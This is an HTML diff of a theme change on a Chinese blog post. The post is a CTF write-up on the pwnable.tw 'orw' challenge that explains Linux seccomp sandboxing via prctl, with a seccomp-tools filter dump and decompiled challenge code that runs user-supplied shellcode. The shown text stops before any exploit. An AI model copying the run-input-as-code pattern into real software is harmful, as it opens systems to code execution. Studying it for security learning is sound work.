+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Kylinxin</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Kylinxin</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-23 15:14:29</span>
+        <span class="mobile">2023-07-23 15:14:29</span>
+        <span class="hover-info">创建</span>
+    </span>
     
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2023/07/23/prctl-seccomp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/faction/1.png">
-      <meta itemprop="name" content="Kylinxin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Kylinxin's Blog">
-      <meta itemprop="description" content="Kylinxin's Blog">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="prctl-seccomp-orw | Kylinxin's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          prctl-seccomp-orw
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-07-23 15:14:29" itemprop="dateCreated datePublished" datetime="2023-07-23T15:14:29+08:00">2023-07-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn-%E8%BF%9B%E9%98%B6/" itemprop="url" rel="index"><span itemprop="name">pwn 进阶</span></a>
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-23 15:14:29</span>
+            <span class="mobile">2023-07-23 15:14:29</span>
+            <span class="hover-info">更新</span>
         </span>
-    </span>
+    
 
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>12k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>44 分钟</span>
-    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn-%E8%BF%9B%E9%98%B6/">pwn 进阶</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/orw/">orw</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>20 分钟</span>
+        </span>
+    
+    
 </div>
 
-        </div>
-      </header>
+				</div>
+			</div>
+		</div>
+		
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h1 id="初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）"><a href="#初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）" class="headerlink" title="初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）"></a><strong>初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</strong></h1><blockquote>
-<p>题目来源：<a target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#2%EF%BC%88orw%EF%BC%89">https://pwnable.tw/challenge/#2（orw）</a><br>参考资料：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/186447">https://www.anquanke.com/post/id/186447</a><br><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a><br><a target="_blank" rel="noopener" href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A">https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A</a>  密码: hvqc<br>–来自百度网盘超级会员V3的分享</p>
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）"><a href="#初探（Linux-Kernel）sandbox中的prctl-seccomp机制（orw）" class="headerlink" title="初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）"></a><strong>初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</strong></h1><blockquote>
+<p>题目来源：<a class="link"  target="_blank" rel="noopener"  href="https://pwnable.tw/challenge/#2%EF%BC%88orw%EF%BC%89" >https://pwnable.tw/challenge/#2（orw）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>参考资料：<br><a class="link"  target="_blank" rel="noopener"  href="https://www.anquanke.com/post/id/186447" >https://www.anquanke.com/post/id/186447<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"  target="_blank" rel="noopener"  href="https://man7.org/linux/man-pages/man2/prctl.2.html" >https://man7.org/linux/man-pages/man2/prctl.2.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"  target="_blank" rel="noopener"  href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" >https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>附件：<br>链接: <a class="link"  target="_blank" rel="noopener"  href="https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A" >https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  密码: hvqc<br>–来自百度网盘超级会员V3的分享</p>
 </blockquote>
 <h2 id="prctl-seccomp-简介"><a href="#prctl-seccomp-简介" class="headerlink" title="prctl-seccomp 简介"></a>prctl-seccomp 简介</h2><p>seccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。</p>
 <blockquote>
 <p>sandbox：沙箱、沙盒</p>
 </blockquote>
 <h2 id="使用seccomp-tools查看可用系统调用（识别沙箱规则）"><a href="#使用seccomp-tools查看可用系统调用（识别沙箱规则）" class="headerlink" title="使用seccomp-tools查看可用系统调用（识别沙箱规则）"></a>使用seccomp-tools查看可用系统调用（识别沙箱规则）</h2><blockquote>
-<p>安装方式：<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
+<p>安装方式：<a class="link"  target="_blank" rel="noopener"  href="https://github.com/david942j/seccomp-tools" >https://github.com/david942j/seccomp-tools<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>$ gem install seccomp-tools</p>
 <p>sudo apt install gcc ruby-dev</p>
 </blockquote>
 <p>执行如下图中命令即可查看此ELF文件中可用的系统调用：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>##从IDA开始分析题目</p>
 <p>将题目下载下来，我们先来看一下程序的代码，直接来到main函数：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>进入orw_seccomp();</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">orw_seccomp</span><span class="hljs-params">()</span><br>&#123;<br>  __int16 v1; <span class="hljs-comment">// [esp+4h] [ebp-84h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+8h] [ebp-80h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  qmemcpy(v3, &amp;unk_8048640, <span class="hljs-keyword">sizeof</span>(v3));<br>  v1 = <span class="hljs-number">12</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">orw_seccomp</span><span class="hljs-params">()</span><br>&#123;<br>  __int16 v1; <span class="hljs-comment">// [esp+4h] [ebp-84h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+8h] [ebp-80h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  qmemcpy(v3, &amp;unk_8048640, <span class="hljs-keyword">sizeof</span>(v3));<br>  v1 = <span class="hljs-number">12</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>我们注意一下代码中的两个prctl：</p>
 <blockquote>
@@ -313,41 +632,46 @@
 </blockquote>
 <p>先记住这两个函数，接下来会提到，这里暂时先放一放。</p>
 <h2 id="prctl函数原型"><a href="#prctl函数原型" class="headerlink" title="prctl函数原型"></a>prctl函数原型</h2><p>看一下这个函数的原型：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS<br>PR_SET_SECCOMP<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS<br>PR_SET_SECCOMP<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>先来看第一个，PR_SET_NO_NEW_PRIVS：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Set the calling thread<span class="hljs-number">'</span>s no_new_privs attribute to the<br>value in arg2.  With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>)<br>promises not to grant privileges to <span class="hljs-keyword">do</span> anything that could<br>not have been done without the <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title function_">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span></span><br><span class="hljs-params">example, rendering the <span class="hljs-built_in">set</span>-user-ID and <span class="hljs-built_in">set</span>-group-ID mode</span><br><span class="hljs-params">bits, and file capabilities non-functional)</span>.  Once <span class="hljs-built_in">set</span>,<br>the no_new_privs attribute cannot be unset.  The setting<br>of this attribute is inherited by children created by<br><span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> and <span class="hljs-title function_">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, and preserved across <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Set the calling thread<span class="hljs-number">'</span>s no_new_privs attribute to the<br>value in arg2.  With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>)<br>promises not to grant privileges to <span class="hljs-keyword">do</span> anything that could<br>not have been done without the <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title function_">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span></span><br><span class="hljs-params">example, rendering the <span class="hljs-built_in">set</span>-user-ID and <span class="hljs-built_in">set</span>-group-ID mode</span><br><span class="hljs-params">bits, and file capabilities non-functional)</span>.  Once <span class="hljs-built_in">set</span>,<br>the no_new_privs attribute cannot be unset.  The setting<br>of this attribute is inherited by children created by<br><span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> and <span class="hljs-title function_">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, and preserved across <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//设为1</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//设为1</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p>
